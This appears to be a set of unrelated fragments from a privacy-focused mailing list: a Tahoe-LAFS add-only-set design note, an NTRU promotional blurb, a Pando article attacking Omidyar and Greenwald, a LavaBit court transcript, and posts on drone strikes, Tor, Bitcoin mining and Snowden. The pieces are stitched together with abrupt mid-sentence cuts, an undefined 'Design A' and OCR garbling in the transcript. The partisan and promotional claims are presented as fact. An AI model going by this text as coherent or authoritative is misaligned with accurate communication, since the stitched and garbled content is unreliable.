good in some other use cases to have an "add-only&write-only" cap,
which allows you to add elements into the set but doesn't let you read
elements of the set, nor remove nor change previously-added elements.
We agreed to focus on the former case for now, because it is easier to
design and implement a solution to it. (See  for discussion of
write-only caps.)
We agreed to forget about erasure-coding, which makes an
already-confusing problem (how to implement add-only sets without
allowing a few malicious servers, adders, or set-repairers to perform
rollback attack or selection attack), into a very-confusing problem
that exceeded my brain's ability to grapple with it.
So, for now, assume that add-only sets don't use erasure-coding at all.
Now, the basic design we came up with is like this. I'll explain it in
multiple passes of successive refinement of the design.
FIRST PASS: DESIGN "0"
An authorized adder (someone who holds an add-cap) can generate
"elements", which are bytestrings that can be added into the set. (I
mispronounced "elements" as "elephants" at one point, and from that
point forward the design was expressed in terms of a circus act
involving elephants.)
Elephants have an identity as well as a value (bytestring), so:
    aos = DistributedSecureAddOnlySet()
    aos.add_elephant(b"\xFF"*100)
    aos.add_elephant(b"\xFF"*100)
results in aos containing two elephants, not one, even though each
elephant has the same value (the bytestring with one hundred 0xFF
bytes in it).
aos.add_elephant() generates a random 256-bit nonce to make this
elephant different from any other elephant with the same value. I call
this "putting a tag on the elephant's ear" — a "tagged elephant" is a
value plus a nonce. Even if two elephants are identical twins, they
can be distinguished by the unique nonce written on their ear-tags.
aos.add_elephant() then puts a digital signature on the
tagged-elephant (using the add-only-cap, which contains an Ed25519
private key), and sends a copy of the tagged-elephant to every one of
N different servers. Putting a digital signature on a tagged-elephant
is called "wrapping a net around it".
A reader downloads all the tagged-elephants from all the servers,
checks all the signatures, takes the union of the results, and returns
the resulting set of elephants.
Design "A" relies on at least one of the servers that you reach to
save you from rollback or selection attacks. Such a server does this
by knowing, and honestly serving up to you, a fresh and complete set
of tagged-elephants. “Rollback” is serving you a version of the set
that existed at some previous time, so the honest server giving you a
copy of the most recent set protects you from rollback attack.
“Selection” is omitting some elephants from the set, so the honest
server giving you a complete copy of the set protects you from
selection attack.
SECOND PASS: DESIGN "1"
We can extend Design "0" to make it harder for malicious servers to
perform selection attacks on readers, even when the reader doesn't
reach an honest server who has a complete copy of the most recent set.
The unnecessary vulnerability in Design "0" is that each
tagged-elephant is signed independently of the other tagged-elephants,
so malicious servers can deliver some tagged-elephants to a reader and
withhold other tagged-elephants, and the reader will accept the
resulting set, thus falling for a selection attack. To reduce this
vulnerability, adders will sign all of the current tagged-elephants
along with their new tagged-elephant with a single signature. More
precisely, let the "identity" of a tagged-elephant be the secure hash
of the tagged-elephant (i.e. the secure hash of the nonce concatenated
with the value). The signature on a new tagged-elephant covers the
identity of that tagged-elephant, concatenated with the identities of
all extant tagged-elephants, under a single signature. In circus
terms, you add the new tagged-elephant into a pile of tagged-elephants
and throw a net over the entire pile, including the new
Now, malicious servers can't omit any of the older tagged-elephants
without also omitting the new tagged-elephant. Readers will not accept
the new tagged-elephant unless they also have a copy of all of the
other tagged-elephants that were signed with the same signature. This
limits the servers's options for selection attacks.
THIRD PASS: DESIGN "2"
We can refine Design "1" to make it cleaner and more CPU-efficient and
network-efficient. This will also lay the groundwork for an efficient
network protocol.
The unnecessary "dirtiness" in Design "1" is that the digital
signatures on older tagged-elephants become extraneous once you add a
new digital signature. We have a mass of tagged-elephants, we throw a
net over the whole mass, then later when we add a new tagged-elephant
to the pile, we throw a new net on top of the new (slightly larger)
pile. Now the underlying net has become redundant: once you've
verified the signature of the outermost net, there is no need to check
the signature of the inner net. In fact, if one implementation checks
the signature of the inner net and another implementation does not
check it, then a malicious adder colluding with a malicious server
could cause the implementations to differ in their results, by putting
an invalid net (an invalid signature) topped by a new tagged-elephant
with a valid net. (Daira was the one who noticed that issue.)
To make this cleaner and more efficient, we will never put a net
around a net, and instead we'll keep each tagged-elephant in a box.
When you want to add a new tagged-elephant to a set, you rip off and
throw away any extant nets, then you put the new tagged-elephant in a
box which is nailed on top of the previous topmost box. Then you wrap
a net around the new topmost box. "Nailing" box Y on top of box X
means taking the secure hash of box X and appending that to box Y
(before signing box Y). A "box" is a tagged-elephant concatenated with
any number of "nails", each of which is the secure hash of a previous
(Note that you can sometimes have two or more boxes precariously
perched at the top of a stack, when two adders have simultaneously
added a box before each saw the other's new box. That's okay — the
next time an adder adds a box on top of this stack, he'll nail his new
box to each of the previous topmost boxes.)
Boxes are a lot more CPU-efficient than nets, and more importantly
nobody (neither readers, adders, nor servers) needs to revisit a
lower-down box in order to add a new top-most box. Once you nail box Y
on top of box X, then you can later add box Z just by taking the hash
of box Y, without revisiting box X.
Note that we need two different secure hashes here: one is the
identity of a tagged-elephant, which is the secure hash of: the nonce
concatenated with the value. The other is the hash of the box, which
is the secure hash of: the identity of a tagged-elephant concatenated
with the hashes of any previous boxes. We need the identity of a
tagged-elephant for finding out whether a certain tagged-elephant
already exists in a stack (regardless of what position it occupies
within that stack), and we need the hash of the box for efficiently
verifying that all the tagged-elephants in a stack were approved by an
authorized adder.
This also leads to the efficient network protocol: an adder can
remember (cache) the Directed Acyclic Graph of boxes which a given
server previously told the adder about. When the adder wants to add a
new tagged-elephant or a set of new tagged-elephants to that server,
he can send just the boxes which would be new to that server, assuming
that the server hasn't learned anything new since the last time they
talked. Readers can do likewise, remembering what each server
previously told them about, and asking the server to just tell them
about things that are not already covered the topmost box(es) that the
reader already knows about.
Okay, that's it! I think Design "2" is a good one. It has good
security against rollback or selection attacks by malicious servers
(assuming some kind of whitelisting of servers! Which is ticket and is not yet implemented.) And, it doesn't go too far over the top
in terms of complexity; it seems more intuitive to me than (my vague
memories of) previous attempts to design add-only sets for LAFS.
(By the way, there are a few other possible ways to strengthen
defenses against rollback attack, which we've previously considered in
the context of mutable files, but they probably also apply to add-only
I'm excited about this design being feasible, because I think add-only
sets could be a critical building block in valuable use-cases such as
secure logging, secure email, secure backup, and more.
P.S. Thanks to Isis and Mike for showing up today and, when asked what
Tahoe-LAFS improvements they were interested in, suggesting add-only

with the goal of enabling more widespread adoption of this superior

NTRU is a lattice-based public key cryptosystem from Security
Innovation and the leading alternative to RSA and Elliptic Curve
Cryptography (ECC) due to its higher performance and resistance to
attacks from quantum computers. NTRU was developed in 1996 as a
visionary solution to cyber security challenges for the twenty-first
century. NTRU is based on a mathematical problem called the
“Approximate close lattice vector problem” and comprises three
algorithms: NTRUEncrypt, NTRUSign, and PASSSign. It has been reviewed
and published in scholarly journals and presented at Crypto,
Eurocrypt, and RSA, and has been adopted in IEEE and X9 standards
Because it is based on different math from RSA and ECC, the NTRU
algorithm has different cryptographic properties. At comparable
cryptographic strength, NTRU performs costly private key operations
much faster than RSA or ECC. In addition, NTRU's comparative
performance increases with the level of security required. As key
sizes increase by a factor of n, RSA's operations/second decrease by
about n3 whereas NTRU's decrease at n2.

"Keeping Secrets: Pierre Omidyar, Glenn Greenwald and the
privatization of Snowden’s leaks"
 - BY MARK AMES, NOVEMBER 27, 2013
Who “owns” the NSA secrets leaked by Edward Snowden to reporters Glenn
Greenwald and Laura Poitras?
Given that eBay founder Pierre Omidyar just invested a quarter of a
billion dollars to
personally hire Greenwald and Poitras for his new for-profit media
venture, it’s a question worth asking.
It’s especially worth asking since it became clear that Greenwald and
Poitras are now the only two people with full access to the complete
cache of NSA files, which are said to number anywhere from 50,000 to
as many as 200,000 files. That’s right: Snowden doesn’t have the files
any more, the Guardian doesn’t have them, the Washington Post doesn’t
have them… just Glenn and Laura at the for-profit journalism company
created by the founder of eBay.
Edward Snowden has popularly been compared to major whistleblowers
such as Daniel Ellsberg,Chelsea Manning and Jeffrey Wigand. However,
there is an important difference in the Snowden files that has so far
gone largely unnoticed. Whistleblowing has traditionally served the
public interest. In this case, it is about to serve the interests of a
billionaire starting a for-profit media business venture. This is
truly unprecedented. Never before has such a vast trove of public
secrets been sold wholesale to a single billionaire as the foundation
of a for-profit company.
Think about other famous leakers: Daniel Ellsberg neither monetized
nor monopolized the Pentagon Papers. Instead, he leaked them to well
over a dozen different newspapers and media outlets such as the New
York Times and Washington Post, and to a handful of sitting senators —
one of whom, Mike Gravel, read over 4,000 of the 7,000 pages into the
Congressional record before collapsing from exhaustion. The Papers
were published in book form by a small nonprofit run by the Unitarian
Church, Beacon House Press.
Chelsea Manning, responsible for the largest mass leaks of government
secrets ever, leaked everything to WikiLeaks, a nonprofit venture that
has largely struggled to make ends meet in its seven years of
existence. Julian Assange, for all of his flaws, cannot be accused of
crudely enriching himself from his privileged access to Manning’s
leaks; instead, he shared his entire trove with a number of
established media outlets including the Guardian, New York Times, Le
Monde and El Pais. Today, Chelsea Manning is serving a 35-year
sentence in a military prison, while the Private Manning Support
Network constantly struggles to raise funds from donations; Assange
has spent the last year and a half inside Ecuador’s embassy in London,
also struggling to raise funds to run the WikiLeaks operation.
A similar story emerges in the biggest private sector analogy — the
tobacco industry leaks by whistleblowers Merrell Williams and Jeffrey
Wigand. After suffering lawsuits, harassment and attempts to destroy
their livelihoods, both eventually won awards as part of the massive
multibillion dollar settlements — but the millions of confidential
tobacco documents now belong to the public, maintained by a nonprofit,
the American Legacy Project, whose purpose is to help scholars and
reporters and scientists fight tobacco propaganda and power. Every
year, over 400,000 Americans die from tobacco-related illnesses.
The point is this: In the most successful whistleblower cases, the
public has sided with the selfless whistleblower against the power- or
profit-driven entity whose secrets were leaked. The Snowden case
represents a new twist to the heroic whistleblower story arc: After
successfully convincing a large part of the public and the American
Establishment that Snowden’s leaks serve a higher public interest,
Greenwald promptly sold those secrets to a billionaire.
He justified this purely on grounds of self-interest, calling
Omidyar’s offer “a once-in-a-career dream journalistic opportunity.”
Speaking to the Washington Post, Greenwald used crude careerist
terminology to justify his decision to privatize the Snowden secrets:
“It would be impossible for any journalist, let alone me, to decline
this opportunity.”
Let alone me.
News about Greenwald-Poitras’ decision to privatize the NSA cache came
just days after the New York Times reported on Greenwald’s
negotiations with major movie studios to sell a Snowden film. This
past summer, Greenwald sold a book to Metropolitan Books for a
reportedly hefty sum, promising that some of the most sensational
revelations from Snowden’s leaks would be saved for the book.
Indeed what makes the NSA secrets so valuable to Greenwald and Poitras
is that the two of them have exclusive access to the entire cache.
Essentially they have a monopoly over secrets that belong to the
public. For a time, it was assumed that Snowden had kept copies of the
leaked documents, possibly on a number of laptops he was carting
around the world. Greenwald and Poitras were simply conduits between
Snowden’s cache and the public. In late August, Greenwald disclosed
for the first time in a statement to BuzzFeed:
“Only Laura and I have access to the full set of documents which
Snowden provided to journalists.”
Later, from his hideout in Russia, Snowden released a statement
claiming he had left all the NSA files behind in Hong Kong for
Greenwald and Poitras to take. A third Guardian journalist in Hong
Kong at the time, Ewen MacAskill, confirmed to me on Twitter that only
Greenwald and Poitras took with them the full cache. Even the Guardian
was not allowed access to the motherlode.
Clearly, in a story as sensational and global and alluring as
Snowden’s Secrets™, exclusive access equals value. And for the first
time in whistleblower history, that value has been extracted in full
through privatization.
It is one thing for Greenwald to maintain that exclusivity — or
monopoly — while working with the Guardian, a nonprofit with
institutional experience in investigative journalism. It is quite
another for him to sell them to a guy with a history of putting
profits before public interest. As Yasha Levine and I wrote at
NSFWCORP, Omidyar invested in a third-world micro-loans company whose
savage bullying of debtors resulted in mass suicides. Rather than
acknowledge this tragedy, Omidyar Network simply deleted reference to
the company from his website when the shit hit the fan.
This — this? — is the guy we’re supposed to trust with the as-yet
unpublished NSA files? He’s the one we’re relying on to reveal any
dark secrets about the tech industry’s collusion with the NSA? Let’s
hope there’s nothing in there about eBay. Whoops! Deleted!
Since we first raised our concerns, Yasha and I have been swamped with
responses from Greenwald’s followers. The weird thing is, not all of
those responses have been negative: even Wikileaks —Wikileaks! —
responded that, “We have not [fallen out with Greenwald] but is seriously compromised by Paypal’s attacks on our organisation and
Greenwald’s leftist and anarchist fans have always had an almost
cult-like faith in his judgment, seeing him as little less than a
digital-age Noam Chomsky. But now they’re reeling from cognitive
dissonance, trying to understand why their hero would privatize the
most important secrets of our generation to a billionaire
free-marketeer like Omidyar, whose millions have, in some cases,
brought market-based misery into some of the poorest and most
desperate corners of the planet.
A Greenwald-Omidyar partnership is as hard to swallow as if Chomsky
proudly announced a new major venture with Sheldon Adelson, on grounds
that it’s a “once-in-a-career dream academic opportunity.”
WikiLeaks’ concern about Omidyar can be traced back to PayPal’s
decision in December 2010 to blockade users from sending money to
WikiLeaks. PayPal (founded by Pando investor, Peter Thiel — more on
that below) is owned by eBay, where Omidyar has served as the chairman
of the board since 2002. Before the blockade, PayPal was the principal
medium for WikiLeaks donations, according to the Washington Post.
More troubling for fans is that Greenwald has repeatedly provided
cover for Omidyar, claiming that he “had nothing to do with [the
blockade]” despite his board status. Whether or not eBay’s chairman
really was ignorant of his company’s most controversial decision in
years, there’s no denying that Omidyar is also eBay’s largest
shareholder. At nearly 10%, his stake is worth billions and is more
than twice as large as that of the next largest shareholder.
By Greenwald’s reasoning, even though Omidyar is the founder, largest
shareholder, and chairman of the body responsible for eBay/PayPal
management oversight, he had “nothing to do with” its policy towards
Wikileaks. Zero. None. He was as helpless as you, me, Batkid, or
Grumpy Cat.
Fortunately, as the single investor, founder and CEO of “NewCo”,
Omidyar’s self-professed helplessness at eBay doesn’t extend to his
new journalistic venture. With that level of autonomy, no one — not
even Glenn Greenwald, who has admitted that Omidyar’s money is
irresistibly persuasive — can tell him which secrets to publish on his
new site, and which should remain hidden forever.
We can all rest easy in our beds, then, knowing that Omidyar is in
charge of our secrets. Information of national importance, such as
which major tech companies colluded with the US government to spy on
private citizens, will be published at the discretion of the founder
and largest shareholder of one of those companies.
Robbing Peter to Pay Paul (and Mark). An important footnote about
Peter Thiel and Pando, by Paul Carr
When NSFWCORP’s acquisition by Pando was announced, Greenwald raced to
Twitter to accuse us of hypocrisy because Peter Thiel (another
billionaire whose previous business dealings could fill a book, and
who sold PayPal to eBay in the first place) once invested $200,000 in
PandoDaily, through his Founders Fund.
That’s absolutely true. Founders Fund’s investment is disclosed here
on Pando’s main about page, along with the names of the other
investors who collectively invested the remaining $2.8m raised by
The difference between us selling our company to a media outlet that
once received a minority investment from Founders Fund and Greenwald
being personally hired by Omidyar should be obvious to anyone with a
brain. But at the risk that category excludes Glenn’s most ardent
supporters, we’re happy to spell out the difference (apart from the
monetary difference of $249,800,000 between Thiel’s $200k and
Omidyar’s $250 million, of course):
Peter Thiel has no involvement with the running of Pando. Zero. He
doesn’t make hiring or firing or any other kind of decisions (nor do
any other investors), Founders Fund isn’t Pando’s only (or even
closest largest) investor and no one from Founders Fund has a board
seat, voting rights or any other input in business or editorial
policy. In other words, Thiel has less ability to dictate editorial
policy here, in fact, than the guy who cleans the coffee cups (at
least that guy has a key to the office).
Pierre Omidyar is personally hiring the journalists for his new
project, starting with Greenwald himself. He is the venture’s sole
backer. But, you know what? All of that would still be OK if Greenwald
would make a simple, unequivocal, public pledge: to cover any bad
behavior by Pierre Omidyar in the same way that he would cover someone
who wasn’t backing him with millions of dollars.
Should be a simple thing to promise, right?
Here’s our absolute, unequivocal pledge: we will cover Peter Thiel and
Pando’s other investors just as fiercely as we cover Pierre Omidyar or
anyone else. In fact, it’s likely due to proximity that we will cover
Pando’s investors even more fiercely. That’s how we always worked at
NSFWCORP — and it’s how we’ll work here. Our past coverage of Thiel
can be found all over the web, including here, hereand even right here
on Pando. Or see how we’ve covered NSFWCORP/Pando investors
CrunchFundand Vegas Tech Fund.
When we asked Glenn to make that same pledge about his single
investor, in light of our coverage of Omidyar, he responded simply: “I
can’t speak for Omidyar Network,” adding he had “no idea” about
Omidyar’s involvement in micro loans.

@_subject: Pen register request used to force disclosure of SSL private keys - 
this is perhaps the most interesting aspect of the LavaBit proceedings. See:
  in short if you have not designed your system to be amenable to
metadata tapping, particularly all the rich metadata requested by a
"pen register", they're going to demand the encryption keys to access
this metadata.
said again for emphasis:
SSL private keys are demanded under the smallest of justifications,
which need not even show probable cause nor reasonable suspicion!!
(they did later go back with an actual warrant for the keys, but only
after this initial gambit, made repeatedly, failed.)
July 16, 2013
TRANSCRIPT  OF  HEARING
BEFORE  THE  HONORABLE  CLAUDE  M.  HILTON
[ED: James Trump is the fed lawyer, Ladar Levinson the LavaBit operator.]
 THE  COURT:  So  as  I  understand  it,  my  initial  order ordered
nothing  but  that  the  pen  register  be  put  in  place.
MR .  TRUMP :  And  all  technical  assistance,  information, and
facilities  necessary  to  implement  the  pen  register.  And
 it's our  position  t hat  without  the  encryption  keys,  the  data
from  the  pen  register  will  be  meaningless.  So  to  facilitate
the actual  monitoring  required  by  the  pen  register,  the  FBI
also requires  the  encryption  keys .
THE  COURT:  Well,  that  could  be,  but  I  don't  know  that I
need  - - I  don ' t  know  that  I  need  to  reach  that  because
I've issued  a  search  warrant  for  that .
MR.  TRUMP :  Correct,  Your  Honor.  That  the  -- to  avoid
litigating  this  issue,  we  asked  the  Court  to  enter  the
seizure warrant.
THE  COURT :  Well,  what  I ' m  saying  is  if  he  agrees  that the
 pen  register  be  established,  and  that  the  only  thing  he
doesn't  want  to  do  in  connection  with  the  pen  register  is
to give  up  the  encryption  device  or  code
MR.  LEVISON :  I've  always  maintained  that .
THE  COURT :  -- so  we ' ve  got  no  issue  here .  You're ready  to
 do  that?
MR.  LEVISON :  I ' ve  been  ready  to  do  that  since  Agent Howard
 spoke  to  me  the  first  time .
THE  COURT:  All  right .  So  that  ends  our  --
MR .  TRUMP :  Well,  then  we  have  to  inquire  of Mr,  Levison
whether  he  ... Jill  produce  the  encryption  keys  pursuant to
the  search  warrant  that  Your  Honor  just  signed.
THE  COURT :  But  I  can't  deal  with  that  this  morning, can  I?
MR .  TRUMP :  Well ,  it ' s  the  same  issue .  You  could  ask
him,  Your  Honor .  We  can  serve  him  with  the  warrant  and  ask
 him if he' 5  going  to  comply  rather  than  - -
MR.  LEVISON :  Your  Honor I've  also  been  issued  a subpoena
demanding  those  same  keys,  which  I  brought  with  me  in the
event  that  we  would  have  to  address  that  subpoena .
THE  COURT :  I  don't  know,  Mr .  Trump .  I  don't  think  I want
to  get  involved  in  asking  him .  You  can  talk  with  him  and
see  whether  he ' s  going  to  produce  them  or  not  and  let  him
 tell you .  But  I  don ' t  think  I  ought  to  go  asking  what
he's  going  to do  and  what  he's  not  going  to  do  because  I
can ' t  take  any  action about  it  anyway . If he  does  not
comply  with  the  subpoena,  there  are remedies  for  that  one  way
 or  another .
MR .  TRUMP:  Well,  the  original  pen  register  order  was followed
 by  a  compulsion  order  from  Judge  Buchanan .  The compulsion
order  required  the  encr yption  keys  to  be  produced . So ,  yes,
 part  of  the  show  cause  order  is  to  require compliance  both
with  the  pen  register  order  and  the  compulsion order  issued
by  Judge  Buchanan . And  that order,  which  was  attached  to  the
show  cause order,  states,  "To  the  extent  any  information,
facilities,  or technical  assistance  are  under  the  control  of
Lavabit  are  needed to  provide  the  FBI  with  the  encrypted
data,  Lavabit  shall provide  such  information,  facilities,  or
technical  assistance forthwith ."
MR.  LEVISON :  I  would  object  to  that  statement .  I don't  know
 if I'm  wording  this  correctly,  but  what  was  in  that order  to
 compel  was  a  statement  that  was  incorrect . Agent  Howard
seemed  to  believe  that  I  had  the  ability to  encrypt  the
e-mail  content  stored  on  our  servers,  which  is not  the  case .
 I  only  have  the  keys  that  govern  communications into  and  out
 of  the  network ,  and  those  keys  are  used  to secure the
traffic  for  all  users,  not  just  the  user  in  question . So
the  statement  in  that  order  compelling  me  to  decrypt stuff
and  Agent  Howard  stating  that  I  have  the  ability  to  do that
is  technically false  or  incorrect.  There  was  never  an explicit
demand  that  I  turn  over  these  keys .
THE  COURT :  I  don't  know  what  bearing  that  would  have, would
it?  I  mean,  I  don't  have  a  problem  -- Judge  Buchanan issued
an  order  in  addition  to  mine,  and  I'm  not  sure  I  ought  to
be  enforcing  Judge  Buchanan's  order . July  order,  if  he  says
that  he  will  produce  or  allow  the installation  of  the  pen
register,  and  in  addition  I  have  issued a  search  warrant  for
the  codes  that  you  want,  which  I  did  this morning,  that's
been  entered,  it  seems  that  this  issue  is  over as  far  as
I'm  concerned  except  I  need  to  see  that  he  allows  the pen
register  and  complies  with  the  subpoena .
MR .  TRUMP :  Correct .
THE  COURT:  If  he  doesn't  comply  -- if  he  doesn't comply  with
the  subpoena,  then  that  has  -- I  have  to  address that.
MR .  TRUMP :  Right .
THE  COURT:  But  right  now  there's  nothing  for  me  to address
here  unless  he  is  not  telling  me  correctly  about  the  pen
register .
MR.  TRUMP:  Well ,  we  can  -- Your  Honor,  if we  can  talk to  Mr
.  Levison  for  five  minutes,  we  can  ask  him  whether  he  will
honor  the  warrant  that  you  just  issued .
MR.  LEVISON :  Before  we  do  that ,  can  I - -
THE  COURT :  Well,  what  can  I  do  about  it  if  he  doesn't, if
he  tells  you  he's  not  going  to?  You've  got  the  right  to  go
out  and  search  and  get  it .
MR .  TRUMP:  Well,  we  can't  get  the  information  without his
assistance .  He's  the  only  who  knows  and  has  possession  of it
.  We  can't  take  it from  him  involuntarily .
MR .  LEVISON :  If  I  may,  sir,  my  other
THE  COURT :  Wait  just  a  second . You're  trying  to  get  me
ahead .  You're  trying  to  get  me to  deal  with  a  contempt
before  there's  any  contempt ,  and  I  have a  problem  with  that.
MR .  TRUMP:  I'm  trying  to  avoid  contempt  altogether, Your  Honor .
THE  COURT:  I  know  you  are .  And  I'd  love  for  you-all to  get
 together  and  do  that.  I  don't  want  to  deal  with  it either.
But  I  don't  think  we  can  sit  around  and  agree  that there's
going  to  be  a  default  and  I  will  address  it before  it
MR .  TRUMP:  I'm  just  trying  to  figure  out  whether there's
going  to  be  a  default .  We'll  take  care  of  that,  Judge .
THE  COURT :  You  can .  I  think  the  way  we've  got  to  do this
- - and  I'll listen  to  you .  I'm  cutting  you  off,  I  know, but
 I'll listen  to  you  in  a  minute. The  way  we  have  to  do
this,  the  hearing  that's  before me  this  morning  on  this  issue
 of  the  pen  register,  that's  been resolved,  or  so  he's  told
me .  I  don't  know  whether  you  want  to continue  this  one  week
 and  see  if  he  complies  with  that,  which  I guess  would  be
prudent  to  do,  or  a  few  days  for  him  to  comply with  the
pen  register.  Then  we  Hill  wait  and  see  what  happens with
the  SUbpoena . Because  as  far  as  my  pen  register  order  is
concerned, he  says  he's  going  to  comply  with  it .  So  that
issue's  over  and done  with .  The  next  issue  will  be  ...
whether  or  not  he  complies with  the  subpoena .  And  I  don't
know  and  I  don't  want  to presume,  and  I  don't  want  him  to
represent  to  me  what  he  intends to  do  when  he  can  very  well
 go  home  and  decide  he's  going  to  do something  different. When
 that  warrant  is  served,  we'll  know  what  he's  going to  do .
I  think  we've  got  - - I  don't  see  another  way  to  do  it .
MR .  TRUMP :  That's  fine,  Your  Honor.  We  will  serve  the
warrant  on  him  as  soon  as  we  conclude  this  hearing,  and
we'll find  out  whether  he  will  provide  the  keys  or  not .

in the United States this is on par for the targeted assassination

consider a presidential authorization made with unitary executive privilege:
 - 1 x $25,000 for the hellfire missile
 - 1-4 x $8,600 to $25,000 per drone flight hour
== $33,600 to $125,000 per extra-judicial assassination,

we can debate the ethics of remote drone kills separately, though
clearly i'm not an unbiased party.
however, this program fits the definition of "extrajudicial killing"
perfectly. having a secret judge issue a secret ruling that "you can
kill in secret without a trial, without due process, as long as
criteria X is met" does not change the nature of the act.
"An extrajudicial killing is the killing of a person by governmental
authorities without the sanction of any judicial proceeding or legal
process. Extrajudicial punishments are by their nature unlawful, since
they bypass the due process of the legal jurisdiction in which they
occur. Extrajudicial killings often target leading political, trade
union, dissident, religious, and social figures and may be carried out
by the state government or other state authorities like the armed
forces and police."
it was tedious before the first reply; perhaps we can agree that laws
are poor substitute for ethical reasoning and depart this thread on
common ground...

some have suggested a rule  don't distribute updates automatically
to your users and don't implement security critical functions in code
that is delivered to the client via the server.
i have yet to see a definitive case of a US company forced to include
a backdoor in their software or forced to use their software update
channel to deliver a CALEA/intercept friendly version of code to the
targeted customer.  to date all of these requests appear to be off the
record rather than enforced via judicial motion.
this is a shame, since out of date software itself poses significant
risk, and is best resolved via automatic updates from the vendor.
i'll avoid repeating my "email is for public communication" rant ;)
my reading of this sequence of motions is that at least five different
keys were requested, which seems to imply _all_ SSL/TLS keys,
including those for HTTPS sessions.
e.g. they can request "pen register" information for web traffic!

to be clear, this is true when running Tor and the browser on the same
computer, or having a Tor router / proxy appliance that you connect to
as transparent proxy.
in the latter case, you would still be best served by running a copy
of the Tor Browser in "Transparent Tor" mode[0], which delegates
routing through Tor to another service, while providing a browser
environment with all of the useful protections[1] to avoid this very
problem and many others.

the recent releases[0] have shown this to be more complicated than expected.
in terms of sharing: other domestic agencies and some of the FVEY
partners appear to be partially looped in? likely to find out more
over the years,...
in terms of breaking Tor:
the core Tor protocol and network is described repeatedly as difficult
to compromise. attacking the client, opportunistic de-anonymization,
selective denial of service, and mallory-in-the-middle attacks, all
appear extremely effective when they are pointed at Tor users of
interest. Tor's dependencies are failing in practice, rather than the
network or protocol itself.
Roger says the limited number of users targeted is reassuring, “If
those documents actually represent what they can do, they are not as
big an adversary as I thought,”[1]
the lack of widespread de-anonymization of Tor users is an interesting
situation.  i do not agree that they don't have the ability. other
sources clearly show their privileged positioning in the IP core for
active attacks as well as the global passive DPI tapping
infrastructure technically capable of linking large numbers of Tor
instead this implies that the other routes to identifying users,
particularly taking advantage of the endpoint and operational risks
above, are cheaper and more effective.
for less effort and resources locate them via side channel tricks,
infect them with spyware, and observe what they do
pre-encryption-and-pre-proxy directly.  it's clear to see why they've
been using this approach. [here is where i plug Qubes Tor VM, Tails,
so after addressing the client side weaknesses, perhaps the elligator
datagram based effort[3] will be making progress in time to thwart
this new adversary model as the low hanging fruit of Tor client
cracking dries up...

this is why it is useful to run a bitcoind and contribute to the
network, even if you do not mine.
as for contributing with a CPU or GPU it is simply not worth the power cost.

the key is an attacker taking over some majority of the network.  this
is a much longer tangent, of which mining capacity is just a part, and
i still assert that CPU and GPU mining doesn't factor into the overall
risk from malicious peers.
in some few score years there will be zero coins rewarded for mining
blocks - the financial incentive, for what it is currently, merely a
transient part of the bootstrap.
is mining important? sure. but that does not mean a CPU or GPU can
contribute meaningfully to the current network. litecoin, as mentioned
in another reply, is certainly relevant for these architectures
and again, it is just as important to participate in the network, even
if you do not mine! this will always be true, while financial
incentives for mining are transient and volatile.

perhaps your reference to lottery is appropriate; mining as a novelty

we can argue about the greater flaws in our projections, but odds are
scores of decades fall against both our favor in some unexpected
in any case, more circular arguments.  if i could spend X on power for
GPU or direct BTC purchase, the latter is the better investment.
if you continue to claim CPU and GPU mining (for bitcoin currently,

Snowden Says He Took No Secret Files to Russia
By JAMES RISEN
WASHINGTON — Edward J. Snowden, the former National Security Agency
contractor, said in an extensive interview this month that he did not
take any secret N.S.A. documents with him to Russia when he fled there
in June, assuring that Russian intelligence officials could not get
access to them.
Mr. Snowden said he gave all of the classified documents he had
obtained to journalists he met in Hong Kong, before flying to Moscow,
and did not keep any copies for himself. He did not take the files to
Russia “because it wouldn’t serve the public interest,” he said.
“What would be the unique value of personally carrying another copy of
the materials onward?” he added.
He also asserted that he was able to protect the documents from
China’s spies because he was familiar with that nation’s intelligence
abilities, saying that as an N.S.A. contractor he had targeted Chinese
operations and had taught a course on Chinese
“There’s a zero percent chance the Russians or Chinese have received
any documents,” he said.
American intelligence officials have expressed grave concern that the
files might have fallen into the hands of foreign intelligence
services, but Mr. Snowden said he believed that the N.S.A. knew he had
not cooperated with the Russians or the Chinese. He said he was
publicly revealing that he no longer had any agency documents to
explain why he was confident that Russia had not gained access to
them. He had been reluctant to disclose that information previously,
he said, for fear of exposing the journalists to greater scrutiny.
In a wide-ranging interview over several days in the last week, Mr.
Snowden offered detailed responses to accusations that have been
leveled against him by American officials and other critics, provided
new insights into why he became disillusioned with the N.S.A. and
decided to disclose the documents, and talked about the international
debate over surveillance that resulted from the revelations. The
interview took place through encrypted online communications.
Mr. Snowden, 30, has been praised by privacy advocates and assailed by
government officials as a traitor who has caused irreparable harm, and
he is facing charges under the Espionage Act for leaking the N.S.A.
documents to the news media. In the interview, he said he believed he
was a whistle-blower who was acting in the nation’s best interests by
revealing information about the N.S.A.’s surveillance dragnet and huge
collections of communications data, including that of Americans.
He argued that he had helped American national security by prompting a
badly needed public debate about the scope of the intelligence effort.
“The secret continuance of these programs represents a far greater
danger than their disclosure,” he said. He added that he had been more
concerned that Americans had not been told about the N.S.A.’s reach
than he was about any specific surveillance operation.
“So long as there’s broad support amongst a people, it can be argued
there’s a level of legitimacy even to the most invasive and morally
wrong program, as it was an informed and willing decision,” he said.
“However, programs that are implemented in secret, out of public
oversight, lack that legitimacy, and that’s a problem. It also
represents a dangerous normalization of ‘governing in the dark,’ where
decisions with enormous public impact occur without any public input.”
Mr. Snowden said he had never considered defecting while in Hong Kong,
nor in Russia, where he has been permitted to stay for one year. He
said he felt confident that he had kept the documents secure from
Chinese spies, and that the N.S.A. knew he had done so. His last
target while working as an agency contractor was China, he said,
adding that he had had “access to every target, every active
operation” mounted by the N.S.A. against the Chinese. “Full lists of
them,” he said.
“If that was compromised,” he went on, “N.S.A. would have set the
table on fire from slamming it so many times in denouncing the damage
it had caused. Yet N.S.A. has not offered a single example of damage
from the leaks. They haven’t said boo about it except ‘we think,’
‘maybe,’ ‘have to assume’ from anonymous and former officials. Not
‘China is going dark.’ Not ‘the Chinese military has shut us out.’ ”
An N.S.A. spokeswoman did not respond Thursday to a request for
comment on Mr. Snowden’s assertions.
Mr. Snowden said his decision to leak N.S.A. documents developed
gradually, dating back at least to his time working as a technician in
the Geneva station of the C.I.A. His experiences there, Mr. Snowden
said, fed his doubts about the intelligence community, while also
convincing him that working through the chain of command would only
lead to retribution.
He disputed an account in The New York Times last week reporting that
a derogatory comment placed in his personnel evaluation while he was
in Geneva was a result of suspicions that he was trying to break in to
classified files to which he was not authorized to have access. (The
C.I.A. later took issue with the description of why he had been
reprimanded.) Mr. Snowden said the comment was placed in his file by a
senior manager seeking to punish him for trying to warn the C.I.A.
